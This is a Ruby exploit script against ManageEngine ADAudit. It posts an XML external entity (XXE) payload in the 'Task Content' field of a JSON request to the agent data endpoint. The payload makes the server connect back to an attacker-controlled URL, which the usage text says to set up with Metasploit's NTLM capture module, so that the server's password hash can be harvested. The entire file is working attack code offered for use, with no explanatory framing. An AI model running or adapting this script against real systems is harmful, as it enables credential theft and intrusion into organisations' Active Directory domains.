require 'json'
require 'socket'
require 'httparty'

def usage()
  puts 'Usage: ruby managenengine-auditad-get-password-hash.rb <target> <connectback url> <domain>'
  puts
  puts 'Get the URL using Metasploit:'
  puts
  puts 'msf6 > use auxiliary/server/capture/http_ntlm'
  puts 'msf6 auxiliary(server/capture/http_ntlm) > exploit'
  puts '[*] Auxiliary module running as background job 0.'
  puts
  puts '[*] Using URL: http://10.0.0.146:8080/5jokll'
  puts '[*] Server started.'
  puts
  puts '--'
  puts
  puts 'Example:'
  puts "  ruby managenengine-auditad-get-password-hash.rb 'http://10.0.0.148:8081/' 'http://10.0.0.146:8080/5jokll' 'ad.example.local'"
  puts

  exit
end

TARGET = ARGV[0] || usage()
CONNECTBACK_URL = ARGV[1] || usage()
DOMAIN = ARGV[2] || usage()

PAYLOAD = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
  <!DOCTYPE data [
    <!ENTITY % xxe SYSTEM \"#{ CONNECTBACK_URL }\"> %xxe;
  ]>
"

puts "Sending payload..."
puts
response = HTTParty.post(
  "#{ TARGET }api/agent/tabs/agentData",
  :body => [{
    "DomainName" => DOMAIN,
    "EventCode" => 4688,
    "EventType" => 0,
    "TimeGenerated" => 0,
    "Task Content" => PAYLOAD,
  }].to_json(),

  :headers => {
    "Content-Type" => "application/json",
  },
)

puts "Response:"
puts response
puts
